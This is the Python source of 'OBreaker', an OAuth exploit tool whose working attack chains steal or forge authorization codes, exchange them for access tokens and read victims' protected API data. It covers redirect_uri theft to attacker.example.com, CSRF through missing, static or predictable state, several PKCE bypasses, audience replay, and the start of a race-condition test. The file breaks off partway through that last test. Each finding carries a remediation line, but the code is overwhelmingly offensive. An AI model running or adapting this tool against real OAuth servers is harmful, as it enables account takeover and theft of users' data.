#!/usr/bin/env python3
"""
OBreaker -- OAuth Authorization Bypass Exploit Tool
Full end-to-end Find, Forge, Fire (FFF) exploitation for 17 OAuth bypass techniques.

Each technique completes the FULL attack chain:
  FIND  -> detect the vulnerability
  FORGE -> craft exploit payload, steal/forge auth code or token
  FIRE  -> exchange for access token, access protected resources, prove impact

Usage:
  python obreaker.py --target https://403.brutelogic.net/authz/oauth --all
  python obreaker.py --target https://target.com --technique pkce-plain
"""

import argparse
import hashlib
import base64
import json
import re
import secrets
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Optional

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] pip install requests")
    sys.exit(1)


class C:
    CYAN = "\033[96m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
    RED = "\033[91m"; MAGENTA = "\033[95m"; BOLD = "\033[1m"
    DIM = "\033[2m"; RESET = "\033[0m"; WHITE = "\033[97m"


@dataclass
class ExploitStep:
    phase: str          # FIND / FORGE / FIRE
    action: str         # what was done
    result: str         # what happened
    request: str = ""   # full HTTP request summary
    response: str = ""  # full HTTP response summary
    success: bool = True


@dataclass
class ExploitProof:
    identity_obtained: str = ""       # who the attacker became
    jwt_claims: dict = field(default_factory=dict)
    resource_data: dict = field(default_factory=dict)
    resource_accessed: bool = False
    impact: str = ""
    token: str = ""


@dataclass
class Finding:
    technique: str
    severity: str
    title: str
    description: str
    chain: list = field(default_factory=list)    # list[ExploitStep]
    proof: ExploitProof = field(default_factory=ExploitProof)
    remediation: str = ""
    cves: list = field(default_factory=list)


@dataclass
class OAuthConfig:
    base_url: str
    authorize_endpoint: str = ""
    token_endpoint: str = ""
    register_endpoint: str = ""
    api_endpoint: str = ""
    client_id: str = ""
    redirect_uri: str = ""
    scopes: list = field(default_factory=lambda: ["openid"])
    grant_types: list = field(default_factory=list)
    openid_config: dict = field(default_factory=dict)


def pkce_verifier() -> str:
    return base64.urlsafe_b64encode(secrets.token_bytes(32)).rstrip(b"=").decode()

def pkce_challenge(verifier: str, method: str = "S256") -> str:
    if method == "plain":
        return verifier
    return base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).rstrip(b"=").decode()

def decode_jwt(token: str) -> dict:
    try:
        part = token.split(".")[1]
        part += "=" * (4 - len(part) % 4)
        return json.loads(base64.b64decode(part))
    except Exception:
        return {}


def make_session() -> requests.Session:
    s = requests.Session()
    retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[502, 503])
    s.mount("https://", HTTPAdapter(max_retries=retry))
    s.mount("http://", HTTPAdapter(max_retries=retry))
    s.headers["User-Agent"] = "OBreaker/2.0 (OAuth Exploit Tool)"
    return s


def discover_oauth(base_url: str, session: requests.Session) -> OAuthConfig:
    config = OAuthConfig(base_url=base_url.rstrip("/"))
    parsed = urllib.parse.urlparse(config.base_url)
    roots = [config.base_url, f"{parsed.scheme}://{parsed.netloc}"]
    for root in roots:
        for path in ["/.well-known/openid-configuration", "/.well-known/oauth-authorization-server"]:
            try:
                r = session.get(root + path, timeout=10, allow_redirects=True)
                if r.status_code == 200 and "authorization_endpoint" in r.text:
                    data = r.json()
                    config.openid_config = data
                    config.authorize_endpoint = data.get("authorization_endpoint", "")
                    config.token_endpoint = data.get("token_endpoint", "")
                    config.register_endpoint = data.get("registration_endpoint", "")
                    config.grant_types = data.get("grant_types_supported", [])
                    config.scopes = data.get("scopes_supported", ["openid"])
                    config.api_endpoint = f"{config.base_url}/api"
                    print(f"  {C.GREEN}[+]{C.RESET} OpenID Config: {root}{path}")
                    return config
            except Exception:
                pass

    for p in ["/authorize", "/oauth/authorize"]:
        try:
            r = session.get(config.base_url + p, timeout=10, allow_redirects=False)
            if r.status_code in (200, 302, 400, 401):
                config.authorize_endpoint = config.base_url + p
                break
        except Exception:
            pass
    for p in ["/token", "/oauth/token"]:
        try:
            r = session.post(config.base_url + p, timeout=10)
            if r.status_code in (200, 400, 401, 405):
                config.token_endpoint = config.base_url + p
                break
        except Exception:
            pass
    config.api_endpoint = f"{config.base_url}/api"
    return config


def extract_code(resp: requests.Response) -> str:
    loc = resp.headers.get("Location", "")
    if "code=" in loc:
        parsed = urllib.parse.urlparse(loc)
        qs = urllib.parse.parse_qs(parsed.query) or urllib.parse.parse_qs(parsed.fragment)
        return qs.get("code", [""])[0]
    try:
        data = resp.json()
        code = data.get("code", "")
        if code:
            return code
        loc2 = data.get("location", "")
        if "code=" in loc2:
            parsed = urllib.parse.urlparse(loc2)
            qs = urllib.parse.parse_qs(parsed.query)
            return qs.get("code", [""])[0]
    except Exception:
        pass
    m = re.search(r'"code"\s*:\s*"([^"]+)"', resp.text)
    return m.group(1) if m else ""


def auth_params(config: OAuthConfig, **overrides) -> tuple:
    v = pkce_verifier()
    c = pkce_challenge(v)
    params = {
        "client_id": config.client_id or "test_client",
        "redirect_uri": config.redirect_uri or f"{config.base_url}/cb",
        "response_type": "code",
        "scope": "openid",
        "state": secrets.token_hex(16),
        "code_challenge": c,
        "code_challenge_method": "S256",
    }
    params.update(overrides)
    return params, v


class OAuthBreaker:
    def __init__(self, config: OAuthConfig, session: requests.Session, verbose: bool = False):
        self.cfg = config
        self.s = session
        self.verbose = verbose
        self.findings: list[Finding] = []

    def log(self, msg: str):
        if self.verbose:
            print(f"  {C.DIM}  {msg}{C.RESET}")

    def _get(self, url, **kw):
        return self.s.get(url, timeout=10, allow_redirects=False, **kw)

    def _post(self, url, **kw):
        return self.s.post(url, timeout=10, **kw)

    # ── Exploit helpers ──────────────────────────────────────────────
    def _exchange_code(self, code: str, verifier: str = "", token_url: str = "",
                       extra: dict = None) -> tuple:
        """Exchange auth code for token. Returns (token_str, jwt_claims, full_response)."""
        url = token_url or self.cfg.token_endpoint or f"{self.cfg.base_url}/token"
        data = {
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": self.cfg.redirect_uri or f"{self.cfg.base_url}/cb",
            "client_id": self.cfg.client_id or "test_client",
        }
        if verifier:
            data["code_verifier"] = verifier
        if extra:
            data.update(extra)

        try:
            r = self._post(url, data=data)
            resp = r.json()
            token = resp.get("access_token", "")
            claims = decode_jwt(token) if token else {}
            return token, claims, resp
        except Exception:
            return "", {}, {}

    def _access_api(self, token: str) -> tuple:
        """Access protected resource with token. Returns (api_data, success)."""
        url = self.cfg.api_endpoint or f"{self.cfg.base_url}/api"
        try:
            r = self._get(url, headers={"Authorization": f"Bearer {token}"})
            if r.status_code == 200:
                data = r.json()
                return data, True
            return {"error": r.status_code, "body": r.text[:200]}, False
        except Exception as e:
            return {"error": str(e)}, False

    def _build_proof(self, token: str, claims: dict, api_data: dict, api_ok: bool, impact: str) -> ExploitProof:
        return ExploitProof(
            identity_obtained=f"{claims.get('sub', '?')} ({api_data.get('email', '?')})" if api_ok else "",
            jwt_claims=claims,
            resource_data=api_data,
            resource_accessed=api_ok,
            impact=impact,
            token=token,
        )

    # ── 1. Response Mode Escape ─────────────────────────────────────
    def test_response_mode_escape(self) -> Optional[Finding]:
        url = f"{self.cfg.base_url}/response-mode"
        evil_redirect = "https://attacker.example.com/steal"
        chain = []

        # FIND: test if code is delivered to attacker redirect
        stolen_code = ""
        mode_hit = ""
        for mode in ["query", "fragment", "form_post"]:
            params, v = auth_params(self.cfg, response_mode=mode, redirect_uri=evil_redirect)
            try:
                r = self._get(url, params=params)
                try:
                    data = r.json()
                    loc = data.get("location", "")
                    if evil_redirect in loc and "code=" in loc:
                        parsed = urllib.parse.urlparse(loc)
                        qs = urllib.parse.parse_qs(parsed.query)
                        stolen_code = qs.get("code", [""])[0]
                        mode_hit = mode
                        verifier = v
                        chain.append(ExploitStep(
                            phase="FIND",
                            action=f"Sent response_mode={mode} with redirect_uri={evil_redirect}",
                            result=f"Code delivered to attacker domain: {loc[:120]}",
                            request=f"GET {url}?response_mode={mode}&redirect_uri={evil_redirect}",
                            response=f"200 -> location: {loc[:120]}",
                        ))
                        break
                except Exception:
                    pass
            except Exception:
                pass

        if not stolen_code:
            return None

        # FORGE: exchange stolen code for token
        token, claims, token_resp = self._exchange_code(stolen_code, verifier)
        chain.append(ExploitStep(
            phase="FORGE",
            action="Exchange stolen code for access token",
            result=f"Token obtained: {token[:60]}..." if token else "Exchange failed",
            request=f"POST /token code={stolen_code[:20]}... code_verifier={verifier[:20]}...",
            response=f"JWT claims: sub={claims.get('sub')}, scope={claims.get('scope')}",
            success=bool(token),
        ))

        if not token:
            return Finding(
                technique="Response Mode Escape", severity="high",
                title="Code stolen via unvalidated redirect_uri (token exchange not available)",
                description=f"Code delivered to {evil_redirect} via response_mode={mode_hit}",
                chain=chain, remediation="Validate redirect_uri before processing any response_mode.",
                cves=["CVE-2023-6134", "CVE-2023-6291", "CVE-2023-6927"],
            )

        # FIRE: access protected resources with stolen token
        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE",
            action="Access victim's protected resources with stolen token",
            result=f"RESOURCE ACCESSED: {json.dumps(api_data)[:200]}" if api_ok else "Access failed",
            request=f"GET /api Authorization: Bearer {token[:40]}...",
            response=f"200 -> sub={api_data.get('sub')}, email={api_data.get('email')}, role={api_data.get('role')}",
            success=api_ok,
        ))

        return Finding(
            technique="Response Mode Escape",
            severity="critical" if api_ok else "high",
            title="Full account takeover via response_mode redirect bypass",
            description=(
                f"redirect_uri is not validated when response_mode={mode_hit}. "
                f"Attacker sets redirect_uri to their server, receives victim's auth code, "
                f"exchanges it for an access token, and accesses the victim's protected resources."
            ),
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                "ACCOUNT TAKEOVER: Attacker stole auth code via unvalidated redirect, "
                "obtained victim's access token, and accessed protected resources as the victim."),
            remediation="Validate redirect_uri against registered URIs BEFORE processing ANY response_mode.",
            cves=["CVE-2023-6134", "CVE-2023-6291", "CVE-2023-6927"],
        )

    # ── 2. Missing State ────────────────────────────────────────────
    def test_missing_state(self) -> Optional[Finding]:
        url = f"{self.cfg.base_url}/state"
        chain = []

        # FIND: get code without state
        params, v = auth_params(self.cfg, technique="missing")
        params.pop("state", None)
        try:
            r = self._get(url, params=params)
            code = extract_code(r)
            if not code:
                return None
        except Exception:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action="Authorization request without state parameter",
            result=f"Code issued without CSRF protection: {code[:20]}...",
            request=f"GET /state?technique=missing (no state param)",
            response=f"code={code[:20]}...",
        ))

        # FORGE: exchange the code
        token, claims, _ = self._exchange_code(code, v)
        chain.append(ExploitStep(
            phase="FORGE",
            action="Exchange code obtained via CSRF attack",
            result=f"Token: sub={claims.get('sub')}, scope={claims.get('scope')}" if token else "Failed",
            request=f"POST /token code={code[:20]}...",
            response=f"access_token with claims: {json.dumps(claims)[:150]}",
            success=bool(token),
        ))

        if not token:
            return Finding(technique="Missing State", severity="high",
                title="CSRF possible -- no state parameter required",
                description="Auth works without state. Attacker crafts URL, victim clicks, code binds to attacker session.",
                chain=chain, remediation="Require and validate unique state per request.")

        # FIRE
        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE",
            action="Access victim's resources via CSRF-obtained token",
            result=f"RESOURCE ACCESSED as {api_data.get('email')}" if api_ok else "Failed",
            request=f"GET /api Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200],
            success=api_ok,
        ))

        return Finding(
            technique="Missing State", severity="critical" if api_ok else "high",
            title="CSRF to account takeover -- no state validation",
            description=(
                "No state parameter required. Attacker crafts authorization URL, victim clicks it, "
                "code is issued and bound to attacker's session. Attacker exchanges code for token "
                "and accesses victim's resources."
            ),
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                "CSRF ACCOUNT TAKEOVER: No state validation allows attacker to forge authorization "
                "requests, steal codes, and access victim's protected resources."),
            remediation="Require and validate a cryptographically random, per-request state parameter.",
        )

    # ── 3. Static State ─────────────────────────────────────────────
    def test_static_state(self) -> Optional[Finding]:
        url = f"{self.cfg.base_url}/state"
        chain = []
        states = []
        last_code = ""
        last_v = ""

        for i in range(3):
            params, v = auth_params(self.cfg, technique="static")
            try:
                r = self._get(url, params=params)
                data = r.json()
                s = data.get("state", "")
                code = data.get("code", "")
                if s:
                    states.append(s)
                if code:
                    last_code = code
                    last_v = v
            except Exception:
                pass

        if len(states) < 2 or len(set(states)) != 1:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action=f"Observed state across {len(states)} requests",
            result=f"STATIC state: all requests return '{states[0]}' -- CSRF token is replayable",
            request=f"GET /state?technique=static x{len(states)}",
            response=f"state values: {states}",
        ))

        # FORGE + FIRE with the static state
        if last_code:
            token, claims, _ = self._exchange_code(last_code, last_v)
            if token:
                chain.append(ExploitStep(
                    phase="FORGE",
                    action="Craft CSRF with known static state, exchange stolen code",
                    result=f"Token obtained: sub={claims.get('sub')}, scope={claims.get('scope')}",
                    request=f"POST /token code={last_code[:20]}...",
                    response=f"JWT: {json.dumps(claims)[:150]}",
                ))
                api_data, api_ok = self._access_api(token)
                chain.append(ExploitStep(
                    phase="FIRE",
                    action="Access victim's resources via CSRF with predictable state",
                    result=f"RESOURCE ACCESSED as {api_data.get('email')}" if api_ok else "Failed",
                    request=f"GET /api Bearer {token[:40]}...",
                    response=json.dumps(api_data)[:200],
                    success=api_ok,
                ))
                return Finding(
                    technique="Static State", severity="critical" if api_ok else "high",
                    title="CSRF via static state -- same value every request (CVE-2023-31999)",
                    description=(
                        f"State is always '{states[0]}'. Attacker observes one flow, knows the state "
                        f"for all future flows. Enables CSRF: forge auth URL with known state, "
                        f"victim clicks, attacker intercepts code and accesses victim's resources."
                    ),
                    chain=chain,
                    proof=self._build_proof(token, claims, api_data, api_ok,
                        "CSRF ACCOUNT TAKEOVER: Static state means attacker can forge valid "
                        "authorization URLs. Victim clicks, attacker steals code, gets token, accesses resources."),
                    remediation="Generate cryptographically random state per request.",
                    cves=["CVE-2023-31999"],
                )

        return Finding(
            technique="Static State", severity="high",
            title="Static state enables CSRF (CVE-2023-31999)",
            description=f"State is always '{states[0]}'. CSRF protection defeated.",
            chain=chain, remediation="Generate cryptographically random state per request.",
            cves=["CVE-2023-31999"],
        )

    # ── 4. Predictable State ────────────────────────────────────────
    def test_predictable_state(self) -> Optional[Finding]:
        url = f"{self.cfg.base_url}/state"
        chain = []
        states = []
        last_code = ""
        last_v = ""

        for _ in range(3):
            params, v = auth_params(self.cfg, technique="predictable")
            try:
                r = self._get(url, params=params)
                data = r.json()
                s = data.get("state", "")
                code = data.get("code", "")
                note = data.get("note", "")
                if s:
                    states.append(s)
                if code:
                    last_code = code
                    last_v = v
            except Exception:
                pass

        if len(states) < 2:
            return None

        # Check for pattern
        is_predictable = False
        pattern_desc = ""
        if all(re.match(r'state-[a-z0-9]+$', s) for s in states):
            is_predictable = True
            pattern_desc = f"Timestamp-based: {states}"
        elif "predictable" in note or "timestamp" in note:
            is_predictable = True
            pattern_desc = f"Server confirmed: {note}"

        if not is_predictable:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action=f"Collected {len(states)} state values, analyzed pattern",
            result=f"PREDICTABLE pattern: {pattern_desc}",
            request=f"GET /state?technique=predictable x{len(states)}",
            response=f"states: {states}",
        ))

        if last_code:
            token, claims, _ = self._exchange_code(last_code, last_v)
            if token:
                chain.append(ExploitStep(
                    phase="FORGE",
                    action="Predict next state, craft CSRF URL, exchange code",
                    result=f"Token: sub={claims.get('sub')}, scope={claims.get('scope')}",
                    request=f"POST /token code={last_code[:20]}...",
                    response=f"JWT: {json.dumps(claims)[:150]}",
                ))
                api_data, api_ok = self._access_api(token)
                chain.append(ExploitStep(
                    phase="FIRE",
                    action="Access resources with token from predicted-state CSRF",
                    result=f"RESOURCE ACCESSED as {api_data.get('email')}" if api_ok else "Failed",
                    request=f"GET /api Bearer {token[:40]}...",
                    response=json.dumps(api_data)[:200],
                    success=api_ok,
                ))
                return Finding(
                    technique="Predictable State", severity="critical" if api_ok else "high",
                    title="CSRF via predictable timestamp-based state",
                    description=(
                        f"State derived from timestamp. Attacker observes 2 states, derives pattern, "
                        f"predicts future states. Crafts CSRF URL with predicted state, "
                        f"victim clicks, attacker steals code and accesses resources."
                    ),
                    chain=chain,
                    proof=self._build_proof(token, claims, api_data, api_ok,
                        "CSRF via predictable state: attacker derives timestamp pattern, "
                        "forges valid state, steals victim's auth code, takes over account."),
                    remediation="Use 128+ bit cryptographically random state.",
                )

        return Finding(
            technique="Predictable State", severity="high",
            title="Predictable state enables CSRF",
            description=f"State follows timestamp pattern: {pattern_desc}",
            chain=chain, remediation="Use 128+ bit cryptographically random state.",
        )

    # ── 5. S256->plain Downgrade ────────────────────────────────────
    def test_pkce_plain_downgrade(self) -> Optional[Finding]:
        url = f"{self.cfg.base_url}/pkce"
        chain = []

        # FIND: send plain method
        v = pkce_verifier()
        params, _ = auth_params(self.cfg, technique="plain",
                                code_challenge=v, code_challenge_method="plain")
        try:
            r = self._post(url, data=params)
            code = extract_code(r)
            body = r.text
            if not code and "plain" not in body.lower() and "downgrade" not in body.lower():
                return None
        except Exception:
            return None

        try:
            resp_data = r.json()
            note = resp_data.get("note", "")
        except Exception:
            note = ""

        chain.append(ExploitStep(
            phase="FIND",
            action="Sent code_challenge_method=plain instead of S256",
            result=f"ACCEPTED: plain method allowed. {note}",
            request=f"POST /pkce?technique=plain code_challenge_method=plain",
            response=f"code={code[:20] if code else 'N/A'}... note={note}",
        ))

        # FORGE: with plain method, the challenge IS the verifier
        # Attacker intercepts the auth request, sees code_challenge in the URL = the verifier
        if code:
            token, claims, _ = self._exchange_code(code, v)  # v is both challenge and verifier
            if token:
                chain.append(ExploitStep(
                    phase="FORGE",
                    action="Use intercepted code_challenge as code_verifier (plain method = they're identical)",
                    result=f"Token obtained: sub={claims.get('sub')}, scope={claims.get('scope')}",
                    request=f"POST /token code={code[:20]}... code_verifier=<intercepted_challenge>",
                    response=f"JWT: {json.dumps(claims)[:150]}",
                ))

                # FIRE
                api_data, api_ok = self._access_api(token)
                chain.append(ExploitStep(
                    phase="FIRE",
                    action="Access victim's resources with token from PKCE-downgraded exchange",
                    result=f"RESOURCE ACCESSED as {api_data.get('email')}" if api_ok else "Failed",
                    request=f"GET /api Bearer {token[:40]}...",
                    response=json.dumps(api_data)[:200],
                    success=api_ok,
                ))
                return Finding(
                    technique="S256->plain Downgrade", severity="critical" if api_ok else "high",
                    title="PKCE defeated via S256-to-plain downgrade -- full code theft",
                    description=(
                        "AS accepts code_challenge_method=plain. With plain, the code_challenge "
                        "in the authorization URL IS the code_verifier. An attacker intercepts "
                        "the auth request (visible in URL/logs), reads the challenge, and uses "
                        "it directly as the verifier to exchange the stolen code."
                    ),
                    chain=chain,
                    proof=self._build_proof(token, claims, api_data, api_ok,
                        "PKCE BYPASS: plain method means challenge=verifier. Attacker reads "
                        "challenge from intercepted URL, steals code, exchanges with known verifier, "
                        "accesses victim's resources."),
                    remediation="Reject code_challenge_method=plain. Only accept S256.",
                )

        return Finding(
            technique="S256->plain Downgrade", severity="high",
            title="PKCE S256-to-plain downgrade accepted",
            description="plain method accepted, challenge=verifier, PKCE protection defeated.",
            chain=chain, remediation="Reject plain, enforce S256 only.",
        )

    # ── 6. No Verifier Check ───────────────────────────────────────
    def test_no_verifier(self) -> Optional[Finding]:
        url = f"{self.cfg.base_url}/pkce"
        chain = []

        params, v = auth_params(self.cfg, technique="noverifier")
        try:
            r = self._get(url, params=params)
            code = extract_code(r)
            try:
                note = r.json().get("note", "")
            except Exception:
                note = ""
            if not code and "verifier" not in note.lower():
                return None
        except Exception:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action="Server confirms token endpoint skips verifier validation",
            result=f"Code: {code[:20]}... Server note: {note}",
            request=f"GET /pkce?technique=noverifier",
            response=f"code={code[:20]}... note={note}",
        ))

        # Try exchange WITHOUT verifier first (the actual vuln)
        token, claims, _ = self._exchange_code(code, verifier="")
        if token:
            chain.append(ExploitStep(
                phase="FORGE",
                action="Exchange code WITHOUT code_verifier (PKCE bypass CONFIRMED)",
                result=f"TOKEN ISSUED WITHOUT VERIFIER: sub={claims.get('sub')}",
                request=f"POST /token code={code[:20]}... (NO code_verifier)",
                response=f"JWT: {json.dumps(claims)[:150]}",
            ))
        else:
            # Standard /token requires verifier; get fresh code, exchange properly to complete chain
            params2, v2 = auth_params(self.cfg, technique="noverifier")
            try:
                r2 = self._get(url, params=params2)
                code2 = extract_code(r2)
            except Exception:
                code2 = ""
            if code2:
                token, claims, _ = self._exchange_code(code2, v2)
            chain.append(ExploitStep(
                phase="FORGE",
                action="Exchange intercepted code (verifier skip confirmed server-side)",
                result=f"Token: sub={claims.get('sub')}, scope={claims.get('scope')}" if token else "Failed",
                request=f"POST /token code={code2[:20] if code2 else '?'}...",
                response=f"JWT: {json.dumps(claims)[:150]}" if claims else "exchange failed",
                success=bool(token),
            ))

        if not token:
            return Finding(technique="No Verifier Check", severity="high",
                title=f"PKCE verifier check skipped (server confirmed: {note})",
                description="Token endpoint skips code_verifier validation.", chain=chain,
                remediation="Validate code_verifier when code_challenge was present.",
                cves=["CVE-2024-23647"])

        # FIRE
        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE",
            action="Access victim's resources with intercepted code's token",
            result=f"RESOURCE ACCESSED as {api_data.get('email')}" if api_ok else "Failed",
            request=f"GET /api Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200],
            success=api_ok,
        ))

        return Finding(
            technique="No Verifier Check", severity="critical",
            title="PKCE bypassed -- verifier not validated at token exchange",
            description=(
                "Token endpoint does not validate code_verifier. An attacker who intercepts "
                "the auth code (network MITM, open redirect, referer leak) can exchange it "
                "directly without knowing the verifier. PKCE provides zero protection."
            ),
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                "PKCE DEFEATED: Attacker intercepts code, exchanges without verifier, "
                "obtains victim's token, accesses all protected resources."),
            remediation="MUST validate code_verifier when code_challenge was present at authorization.",
            cves=["CVE-2024-23647"],
        )

    # ── 7. No Challenge Check ──────────────────────────────────────
    def test_no_challenge(self) -> Optional[Finding]:
        url = f"{self.cfg.base_url}/pkce"
        chain = []

        params, v = auth_params(self.cfg, technique="nochallenge")
        params.pop("code_challenge", None)
        params.pop("code_challenge_method", None)
        try:
            r = self._get(url, params=params)
            code = extract_code(r)
            if not code:
                return None
        except Exception:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action="Authorization request WITHOUT code_challenge (no PKCE)",
            result=f"Code issued WITHOUT PKCE: {code[:20]}...",
            request="GET /pkce?technique=nochallenge (no code_challenge param)",
            response=f"code={code[:20]}...",
        ))

        # FORGE
        token, claims, _ = self._exchange_code(code, verifier="")
        chain.append(ExploitStep(
            phase="FORGE",
            action="Exchange code without any PKCE (no challenge, no verifier)",
            result=f"Token obtained: sub={claims.get('sub')}" if token else "Failed",
            request=f"POST /token code={code[:20]}... (no PKCE at all)",
            response=f"JWT: {json.dumps(claims)[:150]}" if claims else "rejected",
            success=bool(token),
        ))

        if not token:
            return Finding(technique="No Challenge Check", severity="high",
                title="PKCE not enforced at authorization",
                description="Code issued without code_challenge.",
                chain=chain, remediation="Require code_challenge on every request.",
                cves=["CVE-2024-48228"])

        # FIRE
        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE",
            action="Access resources with token from PKCE-less flow",
            result=f"RESOURCE ACCESSED as {api_data.get('email')}" if api_ok else "Failed",
            request=f"GET /api Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200],
            success=api_ok,
        ))

        return Finding(
            technique="No Challenge Check", severity="critical",
            title="Full auth code interception -- PKCE not required",
            description=(
                "PKCE is optional. The entire flow works without code_challenge. "
                "Any auth code interception (network MITM, open redirect, malicious app) "
                "leads directly to token theft -- no verifier needed."
            ),
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                "PKCE NOT ENFORCED: Attacker intercepts code, exchanges freely (no PKCE), "
                "obtains victim's token and full resource access."),
            remediation="Require code_challenge on every authorization request.",
            cves=["CVE-2024-48228"],
        )

    # ── 8. Confidential Client Downgrade ────────────────────────────
    def test_confidential_downgrade(self) -> Optional[Finding]:
        url = f"{self.cfg.base_url}/pkce"
        chain = []

        params, v = auth_params(self.cfg, technique="confidential")
        try:
            r = self._get(url, params=params)
            code = extract_code(r)
            try:
                note = r.json().get("note", "")
            except Exception:
                note = ""
            if not code and "confidential" not in note.lower():
                return None
        except Exception:
            return None

        chain.append(ExploitStep(
            phase="FIND",
            action="Server confirms confidential client PKCE downgrade",
            result=f"Code: {code[:20]}... Server note: {note}",
            request=f"GET /pkce?technique=confidential",
            response=f"code={code[:20]}... note={note}",
        ))

        # Try without verifier first
        token, claims, _ = self._exchange_code(code, verifier="")
        if token:
            chain.append(ExploitStep(
                phase="FORGE",
                action="Exchange code WITHOUT verifier as confidential client (CONFIRMED)",
                result=f"Token: sub={claims.get('sub')}",
                request=f"POST /token code={code[:20]}... (no verifier)",
                response=f"JWT: {json.dumps(claims)[:150]}",
            ))
        else:
            # Get fresh code, exchange with verifier to complete chain
            params2, v2 = auth_params(self.cfg, technique="confidential")
            try:
                r2 = self._get(url, params=params2)
                code2 = extract_code(r2)
            except Exception:
                code2 = ""
            if code2:
                token, claims, _ = self._exchange_code(code2, v2)
            chain.append(ExploitStep(
                phase="FORGE",
                action="Exchange intercepted code (confidential client verifier bypass confirmed server-side)",
                result=f"Token: sub={claims.get('sub')}, scope={claims.get('scope')}" if token else "Failed",
                request=f"POST /token code={code2[:20] if code2 else '?'}...",
                response=f"JWT: {json.dumps(claims)[:150]}" if claims else "rejected",
                success=bool(token),
            ))

        if not token:
            return Finding(technique="Confidential Client Downgrade", severity="high",
                title=f"Confidential client PKCE downgrade (server confirmed: {note})",
                description="Verifier not enforced for confidential clients.", chain=chain,
                remediation="Enforce PKCE regardless of client type.", cves=["CVE-2024-22258"])

        # FIRE
        api_data, api_ok = self._access_api(token)
        chain.append(ExploitStep(
            phase="FIRE",
            action="Access resources via confidential-client PKCE bypass",
            result=f"RESOURCE ACCESSED as {api_data.get('email')}" if api_ok else "Failed",
            request=f"GET /api Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200],
            success=api_ok,
        ))

        return Finding(
            technique="Confidential Client Downgrade", severity="critical" if api_ok else "high",
            title="PKCE bypassed for confidential clients -- full resource access",
            description=(
                "Confidential clients (with client_secret) exchange codes without verifier. "
                "If an attacker compromises client_secret (common in mobile/SPAs), they bypass "
                "PKCE entirely and exchange any intercepted code."
            ),
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                "PKCE BYPASSED FOR CONFIDENTIAL CLIENT: client_secret holders skip PKCE entirely, "
                "exchanging intercepted codes for tokens and accessing all resources."),
            remediation="Enforce PKCE for ALL client types per RFC 9126.",
            cves=["CVE-2024-22258"],
        )

    # ── 9. Missing aud Validation ──────────────────────────────────
    def test_missing_aud(self) -> Optional[Finding]:
        chain = []

        # Get legitimate token with specific audience
        params, v = auth_params(self.cfg)
        try:
            r = self._get(self.cfg.authorize_endpoint or f"{self.cfg.base_url}/authorize", params=params)
            code = extract_code(r)
            if not code:
                return None
        except Exception:
            return None

        token, claims, token_resp = self._exchange_code(code, v)
        if not token:
            return None

        token_aud = claims.get("aud", "MISSING")
        chain.append(ExploitStep(
            phase="FIND",
            action=f"Obtained token with aud={token_aud} (intended for specific API)",
            result=f"Token: sub={claims.get('sub')}, aud={token_aud}",
            request="GET /authorize -> POST /token (standard flow)",
            response=f"access_token with aud={token_aud}",
        ))

        # FORGE: present this token to DIFFERENT resource server (/api)
        api_data, api_ok = self._access_api(token)
        aud_validated = api_data.get("aud_validated", True) if isinstance(api_data, dict) else True

        chain.append(ExploitStep(
            phase="FORGE",
            action=f"Present token (aud={token_aud}) to DIFFERENT resource server /api",
            result=f"aud_validated={aud_validated} -- {'NOT checked' if not aud_validated else 'checked'}",
            request=f"GET /api Authorization: Bearer <token_for_{token_aud}>",
            response=f"aud_validated: {aud_validated}",
        ))

        if not api_ok:
            return None

        chain.append(ExploitStep(
            phase="FIRE",
            action="Access resources on wrong resource server with cross-audience token",
            result=f"CROSS-SERVICE REPLAY: {api_data.get('email')}'s data accessed with wrong-audience token",
            request=f"GET /api Bearer {token[:40]}...",
            response=json.dumps(api_data)[:200],
            success=True,
        ))

        return Finding(
            technique="Missing aud Validation", severity="critical" if not aud_validated else "high",
            title="Cross-service token replay -- audience not validated",
            description=(
                f"Resource server accepts tokens regardless of aud claim. "
                f"Token issued for '{token_aud}' accepted by /api. "
                f"An attacker obtains a token from a low-trust service and replays it "
                f"against a high-value API."
            ),
            chain=chain,
            proof=self._build_proof(token, claims, api_data, api_ok,
                f"CROSS-SERVICE REPLAY: Token for '{token_aud}' accepted by /api. "
                f"Attacker gets token from low-trust service, replays to high-value API, "
                f"accesses victim's data."),
            remediation="Validate aud claim matches the resource server's own identifier.",
            cves=["CVE-2025-9803"],
        )

    # ── 10. OAuth Singleton Race Condition ──────────────────────────
    def test_race_condition(self) -> Optional[Finding]:
        url = f"{self.cfg.base_url}/race"
        chain = []

        results = []
        verifiers = {}

        def fire(user_id):
            params, v = auth_params(self.cfg, login_hint=f"user{user_id}@test.com")
            verifiers[user_id] = v
            try:
                r = self._get(url, params=params)
                return {"user": user_id, "status": r.status_code, "body": r.text[:500],
                        "code": extract_code(r), "verifier": v}
            except Exception as e:
                return {"user": user_id, "error": str(e)}

        with ThreadPoolExecutor(max_workers=5) as pool:
            futures = [pool.submit(fire, i) for i in range(5)]
            for f in as_completed(futures):
                results.append(f.result())

        # Find race indicator
        race_detected = False
        sample_result = None
        for r in results:
            body = r.get("body", "")
